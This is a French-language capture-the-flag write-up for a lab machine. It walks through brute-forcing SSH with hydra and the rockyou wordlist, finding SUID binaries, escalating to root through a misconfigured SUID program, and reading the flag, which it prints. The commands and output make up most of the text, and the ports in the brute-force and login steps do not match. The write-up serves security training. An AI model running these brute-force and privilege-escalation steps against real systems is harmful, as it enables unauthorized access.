# Cellule 4755

## SSH
Pour se connecter en SSH sur cette machine il faut Brute Forcé le service. POur ça nous pouvons utiliser ``hydra``: 
``` Bash
hydra -l user -P rockyou.txt ssh://localhost:2222 -t 4
```
Cette commande nous retournera le mot de passe de l'utilisateur ``user``. 

Nous pouvons donc nous connecter en SSH : 
``` Bash
ssh user@0.0.0.0 -p 5022
{...}
user@0.0.0.0's password :
{...}
user@410d3c3981f0:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

Maintenant que nous sommes connecté en SSH nous pouvons passer à l'escalation de privilège. 

## PrivEsc
L'escalation de privilège ici est une Miss Config. Le binaire que nous allons exploité s'exécute avec les droits ``root`` alors que nous l'exécutions en tant que ``user`` grâce au SUID.

Pour ça nous devons chercher les binaires aillant le SUID ``4`` :
``` Bash
user@5e23f71f0d54:~$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/local/bin/vulnerable
user@5e23f71f0d54:~$ /usr/local/bin/vulnerable
$ id
uid=0(root) gid=1000(user) groups=1000(user)
```
Une fois ``root``nous devons lire le flag dans ``/root/flag.txt```
```Bash
$ cat /root/flag.txt
SKL{SsH-&-B1naRY-PR1v3Sc}
```

Et voilà nous avons réalisé un brute force sur le service ``ssh`` et une escalation de privilège grâce au SUID.
